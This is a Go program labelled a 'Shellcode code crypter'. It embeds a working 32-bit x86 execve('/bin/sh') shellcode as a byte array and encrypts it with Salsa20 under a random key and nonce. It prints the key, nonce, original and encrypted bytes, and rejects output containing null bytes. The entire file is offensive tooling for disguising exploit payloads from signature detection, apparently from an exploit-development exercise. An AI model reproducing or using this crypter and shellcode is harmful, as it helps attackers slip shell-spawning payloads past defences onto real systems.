package main

import "fmt"
import "os"
import "crypto/rand"
import "golang.org/x/crypto/salsa20"

func main() {
	fmt.Printf("Shellcode code crypter\n")

	// execve shellcode /bin/sh
	in := []byte {
		0xeb, 0x1a, 0x5e, 0x31, 0xdb, 0x88, 0x5e, 0x07,
		0x89, 0x76, 0x08, 0x89, 0x5e, 0x0c, 0x8d, 0x1e,
		0x8d, 0x4e, 0x08, 0x8d, 0x56, 0x0c, 0x31, 0xc0,
		0xb0, 0x0b, 0xcd, 0x80, 0xe8, 0xe1, 0xff, 0xff,
		0xff, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68,
		0x41, 0x42, 0x42, 0x42, 0x42, 0x43, 0x43, 0x43,
		0x43 }

	out := make([]byte, len(in))
	
	// Generate a random 24 bytes nonce
	nonce := make([]byte, 24)
	if _, err := rand.Read(nonce); err != nil {
		panic(err)
	}

	// Generate a random 32 bytes key
	key_slice := make([]byte, 32)
    if _, err := rand.Read(key_slice); err != nil {
        panic(err)
    }
	var key [32]byte
	copy(key[:], key_slice[:])

	fmt.Printf("Key len: %d bytes\n", len(key))

	fmt.Printf("Key: ")
	for _, element := range key {
        fmt.Printf("%#x,", element)
    }
	fmt.Printf("\n")

	fmt.Printf("Nonce: ")
    for _, element := range nonce {
        fmt.Printf("%#x,", element)
    }
    fmt.Printf("\n")

	fmt.Printf("Original shellcode: ")

	for _, element := range in {
		fmt.Printf("%#x,", element)
	}
	fmt.Printf("\n")
	salsa20.XORKeyStream(out, in, nonce, &key)

	fmt.Printf("Encrypted shellcode: ")
	for _, element := range out {
        fmt.Printf("%#x,", element)
    }
	fmt.Printf("\n")

	for _, element := range out {
		if element == 0 {
			fmt.Printf("##########################\n")
			fmt.Printf("WARNING null byte detected\n")
			fmt.Printf("##########################\n")
			os.Exit(1)
		}
	}
} 
